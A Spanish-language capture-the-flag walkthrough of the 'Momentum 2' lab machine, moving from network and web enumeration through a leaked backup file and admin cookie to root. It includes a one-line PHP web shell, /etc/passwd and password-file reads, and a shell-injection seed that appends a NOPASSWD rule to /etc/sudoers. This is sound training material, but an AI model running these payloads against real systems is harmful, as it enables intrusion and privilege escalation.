Reconocimiento de la máquina víctima:
> sudo arp-scan -I eth0 --localnet

[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:22:46:4f, IPv4: 192.168.1.79
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     48:8d:36:4f:94:37       Arcadyan Corporation
192.168.1.15    e0:d5:5e:56:4d:af       GIGA-BYTE TECHNOLOGY CO.,LTD.
192.168.1.32    78:c8:81:2a:af:2d       Sony Interactive Entertainment Inc.
192.168.1.12    68:db:f5:00:01:0e       Amazon Technologies Inc.
192.168.1.44    dc:f5:05:5b:28:45       AzureWave Technology Inc.
192.168.1.51    00:0c:29:e0:6e:ef       VMware, Inc.
192.168.1.76    e0:9d:13:c6:e2:52       Samsung Electronics Co.,Ltd
192.168.1.77    d0:37:45:11:23:fa       TP-LINK TECHNOLOGIES CO.,LTD.
192.168.1.98    9c:d2:1e:5d:d5:57       Hon Hai Precision Ind. Co.,Ltd.
192.168.1.34    e8:9f:6d:a5:54:54       Espressif Inc.
192.168.1.130   f8:46:1c:a9:e7:8e       Sony Interactive Entertainment Inc.
192.168.1.45    de:24:d0:58:b9:9f       (Unknown: locally administered)
192.168.1.67    74:60:fa:a4:0c:2b       HUAWEI TECHNOLOGIES CO.,LTD
---------------------------------------------------------------
La máquina víctima parece ser 192.168.1.51
> ping 192.168.1.51 -c 1 

PING 192.168.1.51 (192.168.1.51) 56(84) bytes of data.
64 bytes from 192.168.1.51: icmp_seq=1 ttl=64 time=3.83 ms

--- 192.168.1.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.832/3.832/3.832/0.000 ms
---------------------------------------------------------------
Procedemos a realizar el escaneo sencillo de puertos:
> sudo nmap -sS -p1-1000 -Pn 192.168.1.51

[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 16:07 EST
Nmap scan report for momentum2.home (192.168.1.51)
Host is up (0.0080s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:E0:6E:EF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
---------------------------------------------------------------
Mientras realizamos un escaneo más completo podemos examinar las tecnologías web 
que se están usando en el servidor de la máquina víctima.

El escaneo exhaustivo de los puertos no muestra ningún otro puerto acgtivo:
> sudo nmap -sS -p- -Pn 192.168.1.51

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 16:11 EST
Nmap scan report for momentum2.home (192.168.1.51)
Host is up (0.017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:E0:6E:EF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 425.21 seconds

---------------------------------------------------------------
Tecnolgias web usadas
> whatweb 192.168.1.51                   

http://192.168.1.51 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)],
IP[192.168.1.51], Title[Momentum 2 | Index]
---------------------------------------------------------------
Enumeración inicial de posibles directorios interesantes:
> sudo nmap -sS --script http-enum 192.168.1.51

[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 16:12 EST
Nmap scan report for momentum2.home (192.168.1.51)
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /manual/: Potentially interesting folder
MAC Address: 00:0C:29:E0:6E:EF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 215.84 seconds

---------------------------------------------------------------
Realizamos un escaneo más exhaustivo con wfuzz:
> wfuzz -c --hc 404,200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.51/FUZZ


 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /usr/lib/python3/dist-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.12) or chardet (5.1.0)/charset_normalizer (2.0.6) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.51/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                   
=====================================================================

000000039:   301        9 L      28 W       310 Ch      "img"                     
000000550:   301        9 L      28 W       310 Ch      "css"                     
000000730:   301        9 L      28 W       313 Ch      "manual"                  
000000953:   301        9 L      28 W       309 Ch      "js"                      
000020248:   301        9 L      28 W       311 Ch      "owls"                    
000095524:   403        9 L      28 W       277 Ch      "server-status"           

Total time: 0
Processed Requests: 220560
Filtered Requests: 220554
Requests/sec.: 0

---------------------------------------------------------------
Y antes de mirar e intentar experimentar con la web, podemos hacer un reconocimiento de
versiones de servicios: 
> nmap -sV -n -Pn 192.168.1.51      

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 16:30 EST
Nmap scan report for 192.168.1.51
Host is up (0.0092s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds

---------------------------------------------------------------
De los directorios anteriores obtenidos mediante wfuzz, miramos su contenido si es posible
css - nada interesante.
js - directory listing activado - main.js.
owls - directory listing activado - vacío.

---------------------------------------------------------------

Miramos si hay alguna página html a la que podríamos acceder que no esté listada
> wfuzz -c --hc 404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.51/FUZZ.html

y encontramos la sigulsiente entrada:

...
000000010:   200        45 L     115 W      1428 Ch     "#"                      
000002927:   200        16 L     43 W       513 Ch      "dashboard"   
...

---------------------------------------------------------------

Lo mismo para ficheros php a la que podríamos acceder que no esté listada
> wfuzz -c --hc 404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.51/FUZZ.php

y encontramos la siguiente entrada:

...
000000010:   200        45 L     115 W      1428 Ch     "#"                      
000000577:   200        0 L      0 W        0 Ch        "ajax" 
...

---------------------------------------------------------------

mientras tanto, probamos la página dashboard, que permite subir archivos al directorio owls.
Tras probar muchas cosas, vemos que la página, solo acepta txt.

Utilizando burpsuite, a modo de proxy intentamos cambiar los nombres de los archivos para
probar ataques. Por ejemplo, añadir un caracter "\0" en el nombre del fichero
test.php%00%.txt. El fichero es aceptado, pero no funciona.
También probamos a ver guardar en otro directorio:

../test.txt
Funciona, pero al intentar acceder al fichero, no lo encuentra.
192.169.1.51/test.txt 404 file not found

También probamos a cambiar el mime type, de plain/txt a 
application/x-httpd-php

pero no sirve para nada, el fichero sigue siendo un txt normal y no se interpreta como php

---------------------------------------------------------------

Seguimos enumerando posibles recursos:

https://fileinfo.com/filetypes/web
https://www.file-extensions.org/filetype/extension/name/backup-files

http://192.168.1.51/FUZZ.xml -> nada
http://192.168.1.51/owls/FUZZ.php -> nada
http://192.168.1.51/FUZZ.php -> ajax.php
http://192.168.1.51/FUZZ.asp -> nada
http://192.168.1.51/FUZZ.ajax -> nada
http://192.168.1.51/FUZZ.txt -> nada
http://192.168.1.51/FUZZ.bak -> nada
http://192.168.1.51/FUZZ.html.bak -> nada
http://192.168.1.51/FUZZ.php.bak -> ajax.php.bak !

ajax.php ya lo habíamos inspeccionado previamente. Sin embargo no ajax.php.bak

---------------------------------------------------------------

Descargamos el fihero y hacemos un cat:
>cat ajax.php.bak

───────┬──────────────────────────────────────────────────────────────────────────────────────────
       │ File: ajax.php.bak
───────┼──────────────────────────────────────────────────────────────────────────────────────────
   1   │    
   2   │    
   3   │     //The boss told me to add one more Upper Case letter at the end of the cookie
   4   │    if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){
   5   │ 
   6   │        //[+] Add if $_POST['secure'] == 'val1d'
   7   │         $valid_ext = array("pdf","php","txt");
   8   │    }
   9   │    else{
  10   │ 
  11   │         $valid_ext = array("txt");
  12   │    }
  13   │ 
  14   │    // Remember success upload returns 1 

Así que vemos una manera potencial de añadir subir ficheros php

Hay que añadir una cookie en la request cuando se envía el fichero mediante el dashboard.html
La cookie, se tiene qe llamr admin y valer &G6u@B6uDXMq&Ms. A ese valor abrá que concatenarle una letra en mayúscula según lo que pone ene le comentario.
También debe haber una variable por post que se llame secure y que valga val1d

Para adivinar la letra, podemos utilizar "intruder de Burpsuite" o hacer un script.

───────────────────────────────────────────────────────────────────────────────────────

> ./findcookie.sh
trying cookie %26G6u%40B6uDXMq%26MsR | %26G6u%40B6uDXMq%26MsR
cookie found: %26G6u%40B6uDXMq%26MsR

───────────────────────────────────────────────────────────────────────────────────────

Tras esto vemos que el fichero test.php se ha subido correctamente puesto que se lista correctamente en 
http://192.168.1.51/owls

───────────────────────────────────────────────────────────────────────────────────────

Modificamos la request dentro de Burp Suite para enviar un fichero que nos permita
 crear una web shell:

 > rce.php
 
───────┬──────────────────────────────────────────────────────────────────────────────────────────
       │ File: rce.php
───────┼──────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php system($_GET['c']); ?> 

───────────────────────────────────────────────────────────────────────────────────────

Probamos whoami:
> http://192.168.1.51/owls/rce.php?c=whoami
www-data

cat /etc/passwd
http://192.168.1.51/owls/rce.php?c=cat%20/etc/passwd

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin 
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin 
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin 
athena:x:1000:1000:athena,,,:/home/athena:/bin/bash 
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

Vemos que hay un usuario que se llama athena.
───────────────────────────────────────────────────────────────────────────────────────
Miremos el contenido del directorio home de athena
> http://192.168.1.51/owls/rce.php?c=ls%20-la%20/home/athena

total 32 
drwxr-xr-x 3 athena athena 4096 May 27 2021 . 
drwxr-xr-x 4 root root 4096 May 27 2021 .. 
-rw-r--r-- 1 athena athena 220 May 25 2021 .bash_logout 
-rw-r--r-- 1 athena athena 3526 May 25 2021 .bashrc 
drwxr-xr-x 3 athena athena 4096 May 27 2021 .local 
-rw-r--r-- 1 athena athena 807 May 25 2021 .profile 
-rw-r--r-- 1 athena athena 37 May 27 2021 password-reminder.txt 
-rw-r--r-- 1 root root 241 May 27 2021 user.txt


Vemos un par de ficheros de texto interesantes

───────────────────────────────────────────────────────────────────────────────────────
> http://192.168.1.51/owls/rce.php?c=cat%20/home/athena/password-reminder.txt

password : myvulnerableapp[Asterisk]

> http://192.168.1.51/owls/rce.php?c=cat%20/home/athena/user.txt

/ \ ~ Momentum 2 ~ User Owned ~ \ / 
--------------------------------------------------- 
FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw 
---------------------------------------------------

─────────────────────────────────────────────────────────────────────────────────────
Ahora podemos entrar a la máquina via ssh
sshpass -p "myvulnerableapp*" ssh -o StrictHostKeyChecking=no athena@192.168.1.51 

─────────────────────────────────────────────────────────────────────────────────────

miremos que comandos pueden ser ejecutados con privilegios:
> sudo -l 

athena@momentum2:~$ sudo -l
Matching Defaults entries for athena on momentum2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User athena may run the following commands on momentum2:
    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
athena@momentum2:~$ 

─────────────────────────────────────────────────────────────────────────────────────
Vemos que hay un script de python que se puede ejecutar con privilegios de root.
Ese fichero está ubicado en /home/team-tasks
Vamos a mirar si podemos examinar dicho diretorio:

> cd home
> ls -la
drwxr-xr-x  4 root   root   4096 May 27  2021 .
drwxr-xr-x 18 root   root   4096 May 25  2021 ..
drwxr-xr-x  3 athena athena 4096 Jan 15 08:42 athena
drwxr-xr-x  2 root   root   4096 May 27  2021 team-tasks

podemos entrar en team-tasks
> cd team-tasks
> ls -la
athena@momentum2:/home/team-tasks$ ls -la
total 16
drwxr-xr-x 2 root root 4096 May 27  2021 .
drwxr-xr-x 4 root root 4096 May 27  2021 ..
-rw-r--r-- 1 root root  402 May 27  2021 cookie-gen.py
-rw-r--r-- 1 root root    0 May 27  2021 log.txt
-rw-r--r-- 1 root root  151 May 27  2021 note.txt

miramos note.txt
> cat note.txt

athena@momentum2:/home/team-tasks$ cat note.txt
Hey, Athena use the cookie-gen.py 
to generate secure cookies for our application 
also remove the ajax.php.bak before it's too late.

- administrator

De esto sacamos que posiblemente haya un usuario llamado "administrator"

─────────────────────────────────────────────────────────────────────────────────────

A parte podemos mirar cookie-gen.py

> cat cookie-gen.py 
athena@momentum2:/home/team-tasks$ cat cookie-gen.py 
import random
import os
import subprocess

print('~ Random Cookie Generation ~')
print('[!] for security reasons we keep logs about cookie seeds.')
chars = '@#$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'

seed = input("Enter the seed : ")
random.seed = seed

cookie = ''
for c in range(20):
    cookie += random.choice(chars)

print(cookie)

cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)

─────────────────────────────────────────────────────────────────────────────────────

vemos que podemos inyectar comandos en cmd si añadimos a la seed "; (comandos nuevos) #"

> sudo /usr/bin/python3 /home/team-tasks/cookie

athena@momentum2:/home/team-tasks$ sudo /usr/bin/python3 /home/team-tasks/cookie-gen.py 
~ Random Cookie Generation ~
[!] for security reasons we keep logs about cookie seeds.
Enter the seed : caca; whoami #
bhTCeRKYFXHEd#LFWSXW
athena@momentum2:/home/team-tasks$ caca
root


Tras esto intentamos hacer sudo su, peo no funciona:

> Enter the seed : caca; sudo su # 
FOW$dADJHWKUBcEgAJ$W
athena@momentum2:/home/team-tasks$ caca
bash: initialize_job_control: no job control in background: Bad file descriptor

Con resultados negativos


También intentamos spawnear una bash:
> Enter the seed : caca; /bin/bash # 
JSTOZfeb@VDPSNebXaCS
caca
athena@momentum2:/home/team-tasks$ bash: initialize_job_control: no job control in background: Bad file descriptor

Lo mismo, los resultados son negativos.

podemos mirar el contenido del archivo sudoers.

> Enter seed: caca; cat /etc/sudoers #

HfBBIfZ@M@chIHf$KgH$
caca
athena@momentum2:/home/team-tasks$ #
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL
athena ALL=NOPASSWD:/usr/bin/python3 /home/team-tasks/cookie-gen.py
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:
Intento añadir una nueva linea al final que permita ejecutar /bin/bash 
como root a athena añadiendo athena ALL=NOPASSWD:/bin/bash

> Enter the seed : lolo; echo athena ALL=NOPASSWD:/bin/bash >> /etc/sudoers #
#CTfaeEXEcWdf$Se$EAb
athena@momentum2:/home/team-tasks$ lolo

y ahora vemos otra vez el contenido del archivo sudoers
Enter the seed : caca; cat /etc/sudoers # 
NVI$WEXJMcTCYSIgAeOQ
athena@momentum2:/home/team-tasks$ caca
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL
athena ALL=NOPASSWD:/usr/bin/python3 /home/team-tasks/cookie-gen.py
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
athena ALL=NOPASSWD:/bin/bash

PArece que la linea se ha añadido correctamente

─────────────────────────────────────────────────────────────────────────────────────
Ahora ejecutamos /bin/bash y vemos qué pasa:

> sudo /bin/bash

athena@momentum2:/home/team-tasks$ sudo /bin/bash
root@momentum2:/home/team-tasks# whoami
root


─────────────────────────────────────────────────────────────────────────────────────

Finalmente vamos al directorio root

> cd /root
> ls -la
total 32
drwx------  4 root root 4096 May 27  2021 .
drwxr-xr-x 18 root root 4096 May 25  2021 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 May 25  2021 .config
drwxr-xr-x  3 root root 4096 May 27  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root  253 May 27  2021 root.txt
-rw-r--r--  1 root root  227 May 25  2021 .wget-hsts

> cat root.txt 

//                    \\
}  Rooted - Momentum 2 {
\\                    //

---------------------------------------------------
FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
---------------------------------------------------


by Alienum with <3

